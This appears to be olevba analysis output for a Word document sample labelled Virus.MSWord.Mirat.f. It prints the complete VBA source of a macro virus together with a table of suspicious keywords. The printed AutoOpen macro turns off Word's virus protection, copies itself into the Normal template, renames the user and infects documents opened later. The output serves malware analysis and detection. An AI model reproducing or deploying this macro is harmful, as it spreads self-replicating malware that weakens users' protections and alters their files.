olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Stimpy.bas 
in file: Virus.MSWord.Mirat.f - OLE stream: 'Macros/VBA/Stimpy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 2/1/01 by MI_pirat"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
' Little Stimpy
' Viruz made Feb/1/01 by MI_pirat
zi = Day(Date)
If zi = 2 Then MsgBox "Stimpy is happy to see you !¡"
If Application.UserName = "Stimpy" Then
StatusBar = "..."
Else
Options.VirusProtection = False
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:= _
ActiveDocument.FullName, Destination:= _
myTemplate.FullName, Name:= _
"Stimpy", Object:=wdOrganizerObjectProjectItems
Application.UserName = "Stimpy"
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly _
        :=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate _
        :="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="" _
        , Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
End If
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Infect" Then num = aVar.Index
Next aVar
If num = 0 Then
ActiveDocument.Variables.Add Name:="Infect"
ActiveDocument.Variables("Infect").Value = 1
Set myTemplate = ActiveDocument.AttachedTemplate
Application.OrganizerCopy Source:= _
myTemplate.FullName, Destination:= _
ActiveDocument.FullName, Name:="Stimpy", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
+----------+--------------------+---------------------------------------------+

